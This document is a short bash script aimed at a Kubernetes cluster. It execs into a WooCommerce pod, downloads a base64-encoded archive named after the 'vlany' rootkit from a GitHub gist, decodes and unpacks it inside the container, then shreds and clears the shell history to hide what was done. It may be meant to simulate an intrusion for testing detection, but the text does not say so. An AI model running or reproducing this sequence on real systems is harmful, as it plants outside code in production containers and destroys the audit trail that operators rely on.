#!/bin/bash

POD_NAME=`kubectl get pods -n store-frontend | grep woocommerce | cut -d ' ' -f 1`
kubectl exec -it $POD_NAME -n store-frontend -- bash -c "ls; sleep 0.3; curl https://gist.githubusercontent.com/mateobur/d888e36de12f8fe42a18f54ce4b1fc7c/raw/dd0c4cb23db7cc17a2086c5dee9338522fb8ae69/vlany | base64 -d > vlany-master.tar.gz; rm -rf vlany-master; tar xvfz vlany-master.tar.gz; shred -f ~/.bash_history; history -c;"
